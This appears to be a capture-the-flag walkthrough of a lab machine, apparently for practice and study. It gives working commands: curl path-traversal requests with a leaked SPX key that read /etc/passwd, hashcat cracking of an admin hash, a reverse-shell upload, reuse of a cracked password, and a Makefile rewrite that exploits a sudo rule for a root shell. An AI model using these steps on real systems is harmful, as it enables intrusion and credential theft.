#box

*Created: 1/19/2026*

### Step 1

**Tags:** #Path-Traversal #Web-Applications #SPX #Credentials-Leak #Cracking #hashcat

**Command:**
```bash
python CVE_2024_42007.py -t http://192.168.223.108 -f /etc/passwd

# Or, with cURL

curl "http://192.168.223.108/index.php?SPX_KEY=a2a90ca2f9f0ea04d267b16fb8e63800&SPX_UI_URI=/../../../../../../etc/passwd"

curl "http://192.168.223.108/index.php?SPX_KEY=a2a90ca2f9f0ea04d267b16fb8e63800&SPX_UI_URI=/../../../../../../var/www/html/index.php"

# Finally we crack the discovered admin's hash:
hashcat -m 3200 '$2y$10$7LaMUa8an8NrvnQsj5xZ3eDdOejgLyXE8IIvsC.hFy1dg7rPb9cqG' /usr/share/wordlists/rockyou.txt
```

*Port: 80 | 💎 GEM*

> 
> The machine exposes on port 80 a service called TinyFileManager. Fuzzing the endpoint we discover an open `phpinfo.php` file which provides us information about a module called SPX (a PHP Profiler). Its version, the 0.4.15 is vulnerable to a Directory Traversal vulnerability [CVE_2024_42007](https://github.com/BubblyCola/CVE_2024_42007). Once used this script we're able to read the content the file of `/var/www/html/index.php` that shows the presence of two `bcrypt` hashes that can be decrypted with `hashcat` to obtain the admin's password.
> 
> On the `phpinfo.php` endpoint we also have a key for SPX that must be changed inside the script to make it work properly. Can be found under `spx.http_key` with the value of: `a2a90ca2f9f0ea04d267b16fb8e63800`
> We could technically gain a Path Traversal with cURL by pointing at:
> `curl "http://192.168.223.108/index.php?SPX_KEY=a2a90ca2f9f0ea04d267b16fb8e63800&SPX_UI_URI=/../../../../../../etc/passwd"`

---

### Step 2

**Tags:** #Reverse-Shell #Arbitrary-File-Upload

**Command:**
```bash
# We can either click on the Direct Link option inside the app or by using cURL at:

curl "http://192.168.223.108/shell.php"
```

*Port: 80*

> 
> Once obtained the password and tried that we cannot authenticate with the user `profiler` in SSH, we authenticate to the FileManager and upload the PentestMonkey PHP Reverse Shell and obtain a shell on port 22. Once we uploaded the file, an option called 'Direct Link' (the fourth from the left) permits us to gain a shell

---

### Step 3

**Tags:** #Credentials-Leak #Credential-Reuse

**Command:**
```bash
su profiler
> lowprofile
```

> 
> Once gained a shell as `www-data`, after exhausting all the possible option we try to authenticate with `profiler:lowprofile` (the password cracked earlier) and gain lateral movement onto that user

---

### Step 4

**Tags:** #Make #binaries #sudo-Privileges

**Command:**
```bash
# First, we make a backup of the original file
mv /home/profiler/php-spx/Makefile /home/profiler/php-spx/Makefile_bk

# Then we use echo to add the custom command (the \t is required to make the Makefile be properly formatted)
echo -e 'install:\n\t/bin/sh' > /home/profiler/php-spx/Makefile
```

> 
> The user `profile` can execute a very specific command as `root`. It can run `(ALL) /usr/bin/make install -C /home/profiler/php-spx` . Basically this tells that the binary make is gonna run the command `install` inside the `Makefile` as root. The makefile is located at `/home/profiler/php-spx`. We then decide to update the `install` command to grant us a shell

---

